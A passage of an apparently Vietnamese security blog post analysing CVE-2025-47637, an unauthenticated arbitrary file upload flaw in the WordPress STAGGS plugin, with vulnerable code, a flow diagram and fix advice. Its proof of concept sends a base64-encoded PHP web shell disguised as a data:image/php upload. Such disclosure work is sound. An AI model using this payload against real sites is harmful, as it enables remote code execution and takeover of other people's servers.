</span></span><span class="line hl"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nx">preg_match</span><span class="p">(</span> <span class="s1">&#39;/^data:image\/(.*);base64,/&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Valid base64 image.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span> <span class="nv">$data</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$type</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span> <span class="nv">$type</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span> <span class="c1">// jpg, png, gif
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="s1">&#39; &#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nv">$data</span> <span class="o">===</span> <span class="k">false</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">throw</span> <span class="k">new</span> <span class="nx">\Exception</span><span class="p">(</span><span class="s1">&#39;Image decode failed. Try again.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> 
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$upload_dir</span> <span class="o">=</span> <span class="nx">wp_get_upload_dir</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$base_dir</span>   <span class="o">=</span> <span class="nv">$upload_dir</span><span class="p">[</span><span class="s1">&#39;basedir&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="c1">// Allow different location.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nv">$save_path</span>  <span class="o">=</span> <span class="nx">apply_filters</span><span class="p">(</span> <span class="s1">&#39;staggs_image_save_dir&#39;</span><span class="p">,</span> <span class="nv">$base_dir</span> <span class="o">.</span> <span class="s1">&#39;/staggs&#39;</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span> <span class="nx">file_exists</span><span class="p">(</span> <span class="nv">$save_path</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span> <span class="nv">$save_path</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nv">$main_image</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// Main product image.
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">count</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$imagename</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span> <span class="nx">wp_json_encode</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line hl"><span class="cl">      <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$imagename</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span> 
</span></span><span class="line"><span class="cl">  <span class="o">...</span>
</span></span><span class="line"><span class="cl">  <span class="c1">// Always override in case something went wrong earlier
</span></span></span><span class="line hl"><span class="cl"><span class="c1"></span>  <span class="nx">file_put_contents</span><span class="p">(</span> <span class="nv">$save_path</span> <span class="o">.</span> <span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$image_path_url</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">ABSPATH</span><span class="p">,</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nx">get_site_url</span><span class="p">()</span> <span class="p">),</span> <span class="nv">$save_path</span> <span class="p">);</span>
</span></span><span class="line hl"><span class="cl">  <span class="k">return</span> <span class="nv">$image_path_url</span> <span class="o">.</span> <span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Lệnh:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^data:image\/(.*);base64,/&#39;</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$type</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Dùng để kiểm tra xem biến <code>$data</code> có phải là chuỗi ảnh ở định dạng <strong>Base64 Data URI</strong> <em>hay không.</em>
Cụ thể:</p>
<ul>
<li>
<p><code>^data:image\/</code> → chuỗi phải bắt đầu bằng <code>data:image/</code></p>
</li>
<li>
<p><code>(.*)</code> → lấy phần định dạng ảnh (ví dụ: <code>png</code>, <code>jpeg</code>, <code>gif</code>, …)</p>
</li>
<li>
<p><code>;base64,</code> → tiếp theo phải có chuỗi <code>;base64,</code> (báo hiệu dữ liệu ảnh được mã hóa Base64)</p>
</li>
<li>
<p>Nếu khớp, mảng <code>$type</code> sẽ chứa thông tin định dạng ảnh, ví dụ:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$type</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;png&#39;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
<li>
<p>Nếu không khớp, tức <code>$data</code> <strong>không phải là dữ liệu ảnh Base64 hợp lệ</strong>, hàm trả về <code>0</code>.</p>
</li>
</ul>
<p>Sau đó <code>$type</code> được gán giá trị của <code>$type[1]</code></p>
<div class="details admonition bug open disabled">
  <div class="details-summary admonition-title"><i class="icon fa-fw fa-solid fa-bug" aria-hidden="true"></i>Lỗi</div>
  <div class="details-content">
    <div class="admonition-content"><p>Ta có thể truyền <code>$data=data:image/php;base64...</code> để <code>$type[1] ='php'</code></p></div>
  </div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="nx">is_array</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">count</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$imagename</span> <span class="o">.</span> <span class="s1">&#39;-&#39;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span> <span class="nx">wp_json_encode</span><span class="p">(</span> <span class="nv">$options</span> <span class="p">)</span> <span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$imagename</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$type</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Nếu <code>$options</code> không được truyền thì <code>$filename</code> sẽ có dạng <code>product_title.$type</code></p>
<p>Cuối cùng, file được lưu bằng hàm <code>file_put_contents()</code> và trả về URL đẫn tới nó</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">file_put_contents</span><span class="p">(</span> <span class="nv">$save_path</span> <span class="o">.</span> <span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nv">$data</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$image_path_url</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="nx">ABSPATH</span><span class="p">,</span> <span class="nx">trailingslashit</span><span class="p">(</span> <span class="nx">get_site_url</span><span class="p">()</span> <span class="p">),</span> <span class="nv">$save_path</span> <span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span> <span class="nv">$image_path_url</span> <span class="o">.</span> <span class="s2">&#34;/</span><span class="si">{</span><span class="nv">$filename</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">;</span></span></span></code></pre></td></tr></table>
</div>
</div><h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image\/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
</pre>
  <pre class="mermaid-dark">
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image\/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
</pre>
  <pre class="mermaid-neutral">
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image\/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i><i class="fa-solid fa-check text-success" aria-hidden="true"></i></div>
<template><pre>
graph TD
A["POST to /wp-admin/admin-ajax.php?action=staggs_get_configuration_form_urls"] --> B["staggs_get_configuration_form_urls_ajax()"]
B --> C{"wp_verify_nonce() valid?"}
C -- No --> Z["Return empty JSON"]
C -- Yes --> D{"isset($_POST['image_id'])?"}
D -- No --> Z
D -- Yes --> E["store_final_product_image($image_name, $_POST['image'], $_POST['values'], true)"]
E --> F{"preg_match('/^data:image\/(.*);base64,/', $data, $type) ?" }
F -- No --> Z
F -- Yes --> G["$type = strtolower($type[1]); base64_decode($data)"]
G --> H["file_put_contents( upload_dir/staggs/{$imagename}.{$type}, $data )"]
H --> I["Uploaded file (extension from $type) accessible → Arbitrary File Upload / RCE"]
</pre></template>
</div>
<h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Lấy nonce từ mã nguồn trả về</li>
<li>Gửi POST request</li>
</ol>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">POST</span> <span class="o">/</span><span class="nx">wp</span><span class="o">-</span><span class="nx">admin</span><span class="o">/</span><span class="nx">admin</span><span class="o">-</span><span class="nx">ajax</span><span class="o">.</span><span class="nx">php</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="nx">localhost</span>
</span></span><span class="line"><span class="cl"><span class="o">...</span>
</span></span><span class="line"><span class="cl"><span class="nx">action</span><span class="o">=</span><span class="nx">staggs_get_configuration_form_urls</span><span class="o">&amp;</span><span class="nx">nonce</span><span class="o">=</span><span class="nx">f281c84283</span><span class="o">&amp;</span><span class="nx">image_id</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">image</span><span class="o">=</span><span class="nx">data</span><span class="o">:</span><span class="nx">image</span><span class="o">/</span><span class="nx">php</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA</span><span class="o">/</span><span class="nx">Pg</span><span class="o">==</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Với <code>PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsiY21kIl0pOyA/Pg==</code> mã hóa base64 của <code>&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;</code></p>
<p><figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/request.png" title="Request với Web Shell payload" data-thumbnail="/posts/2025-11-11-cve-2025-47637/request.png" data-sub-html="<h2>Request</h2><p>Request với Web Shell payload</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/request.png' alt="Request" height="413" width="1539"></a><figcaption class="image-caption">Request với Web Shell payload</figcaption>
  </figure></p>
<ol start="3">
<li>Truy cập URL trả về và RCE</li>
</ol>
<p><figure><a class="lightgallery" href="/posts/2025-11-11-cve-2025-47637/result.png" title="RCE với file upload" data-thumbnail="/posts/2025-11-11-cve-2025-47637/result.png" data-sub-html="<h2>Result</h2><p>RCE với file upload</p>"><img loading="lazy" src='/posts/2025-11-11-cve-2025-47637/result.png' alt="Result" height="589" width="1533"></a><figcaption class="image-caption">RCE với file upload</figcaption>
  </figure></p>
<h2 class="heading-element" id="conclusion"><span>Conclusion</span>
  <a href="#conclusion" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>Lỗ hổng cho phép <strong>unauthenticated</strong> kẻ tấn công tải lên file tùy ý (ví dụ web shell) thông qua endpoint AJAX của plugin STAGGS do thiếu xác thực kiểu file trước khi lưu. Kẻ tấn công có thể lấy <code>nonce</code> từ mã nguồn công khai, gửi <code>data:</code> URI giả mạo (vd. <code>data:image/php;base64,...</code>) và tạo file PHP trên máy chủ, dẫn tới RCE. Vấn đề đã được khắc phục trong phiên bản <strong>2.12.0</strong> bằng cách giới hạn phần mở rộng được chấp nhận (png, jpg, jpeg, gif).</p>
<h2 class="heading-element" id="key-takeaway"><span>Key Takeaway</span>
  <a href="#key-takeaway" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ul>
<li>Lỗ hổng bắt nguồn từ <strong>không kiểm tra hợp lệ kiểu/đuôi file</strong> trước khi lưu; kiểm tra client-side/regex không đủ nếu không ràng buộc phần mở rộng và nội dung thực tế.</li>
<li>Không để endpoint quan trọng cho phép hành động upload chạy ở chế độ <strong>nopriv (unauthenticated)</strong> nếu không có cơ chế xác thực và hạn chế chặt.</li>
<li><code>nonce</code> chèn trong mã nguồn có thể bị thu thập và tái sử dụng — không dựa chỉ vào nonce hiển thị công khai để ngăn thao tác nhạy cảm.</li>
<li>Cần validate cả <strong>MIME type</strong>, <strong>phần mở rộng</strong>, và (nếu có thể) kiểm tra nội dung thực tế của file trên server; lưu file upload ở vị trí không thể thực thi hoặc chuyển đổi thành non-executable.</li>
<li>Cập nhật plugin lên <strong>&gt;= 2.12.0</strong> ngay lập tức; kiểm tra site cho các file khả nghi trong thư mục upload <code>staggs/</code> nếu site chạy phiên bản cũ.</li>
</ul>
<h2 class="heading-element" id="references"><span>References</span>
  <a href="#references" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><a href="https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"target="_blank" rel="external nofollow noopener noreferrer">Arbitrary File Upload</a></p>
<p><a href="https://patchstack.com/database/wordpress/plugin/staggs/vulnerability/wordpress-staggs-2-10-1-arbitrary-file-upload-vulnerability"target="_blank" rel="external nofollow noopener noreferrer">WordPress STAGGS Plugin &lt;= 2.11.0 is vulnerable to Arbitrary File Upload</a></p></div><hr class="awesome-hr" />
    <h2 id="see-also">Nội dung liên quan</h2>
    <ul><li>
          <a href="/vi/posts/2025-11-12-cve-2025-32202/" title="CVE-2025-32202 Analysis &amp; POC">CVE-2025-32202 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-10-cve-2023-48777/" title="CVE-2023-48777 Analysis &amp; POC">CVE-2023-48777 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-09-cve-2025-1128/" title="CVE-2025-1128 Analysis &amp; POC">CVE-2025-1128 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-13-cve-2025-7847/" title="CVE-2025-7847 Analysis &amp; POC">CVE-2025-7847 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-08-cve-2025-39557/" title="CVE-2025-39557 Analysis &amp; POC">CVE-2025-39557 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-07-cve-2025-47577/" title="CVE-2025-47577 Analysis &amp; POC">CVE-2025-47577 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-06-cve-2025-10647/" title="CVE-2025-10647 Analysis &amp; POC">CVE-2025-10647 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-05-cve-2025-10147/" title="CVE-2025-10147 Analysis &amp; POC">CVE-2025-10147 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-20-cve-2025-49386/" title="CVE-2025-53572 Analysis &amp; POC">CVE-2025-53572 Analysis &amp; POC</a></li><li>
          <a href="/vi/posts/2025-11-19-cve-2025-6742/" title="CVE-2025-6742 Analysis &amp; POC">CVE-2025-6742 Analysis &amp; POC</a></li></ul><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod"><span title="Cập nhật ngày 2025-11-08 02:31:50">Cập nhật ngày 2025-11-08&nbsp;<a class="git-hash" href="https://github.com/w41bu1/w41bu1.github.io/commit/cfb821c4fb66923b53942e7e23d54c37ae404698" rel="external nofollow noopener noreferrer" target="_blank" title="Update and add post&#10&#10Commit: cfb821c4fb66923b53942e7e23d54c37ae404698 [cfb821c]&#10Author: w41bu1&#10Date: 2025-11-08 02:31:50"><i class="fa-solid fa-hashtag fa-fw" aria-hidden="true"></i>cfb821c</a></span>
      </div><div class="post-info-license">
            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
          </div></div><div class="post-info-line">
        <div class="post-info-md"><span><a href="/vi/posts/2025-11-11-cve-2025-47637/index.md" title="Đọc với định dạng Markdown" class="link-to-markdown">Đọc với định dạng Markdown</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-11-CVE-2025-47637%5cindex.vi.md?plain=1" title="Xem mã nguồn"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-source">Xem mã nguồn</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/edit/main/content/posts%5c2025-11-11-CVE-2025-47637%5cindex.vi.md" title="Chỉnh sửa trang này"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">Chỉnh sửa trang này</a></span><span><a href="https://github.com/w41bu1/w41bu1.github.io/issues/new?title=[BUG]%20CVE-2025-47637&#43;Analysis&#43;%26&#43;POC&amp;body=%7cField%7cValue%7c%0A%7c-%7c-%7c%0A%7cTitle%7cCVE-2025-47637&#43;Analysis&#43;%26&#43;POC%7c%0A%7cURL%7chttp://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/%7c%0A%7cFilename%7chttps://github.com/w41bu1/w41bu1.github.io/blob/main/content/posts%5c2025-11-11-CVE-2025-47637%5cindex.vi.md?plain=1%7c" title="Báo cáo lỗi"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-report">Báo cáo lỗi</a></span><span><a href="vscode://file/D:%5cwork%5cproject%5cw41bu1.github.io%5ccontent%5cposts%5c2025-11-11-CVE-2025-47637%5cindex.vi.md" title="Mở trong trình chỉnh sửa"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-vscode">Mở trong trình chỉnh sửa</a></span></div>
        <div class="post-info-share">
          <span><a href="javascript:void(0);" title="Chia sẻ trên X" data-sharer="twitter" data-url="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/" data-title="CVE-2025-47637 Analysis &amp; POC" data-hashtags="analyst,plugin,arbitrary file upload"><i class="fa-brands fa-x-twitter fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Facebook" data-sharer="facebook" data-url="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/" data-hashtag="analyst"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/"><i class="fa-brands fa-linkedin fa-fw" aria-hidden="true"></i></a>
  <a href="javascript:void(0);" title="Chia sẻ trên Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/vi/posts/2025-11-11-cve-2025-47637/" data-title="CVE-2025-47637 Analysis &amp; POC"><i class="fa-brands fa-hacker-news fa-fw" aria-hidden="true"></i></a>
  </span>
        </div>
      </div></div>

  <div class="post-info-more">
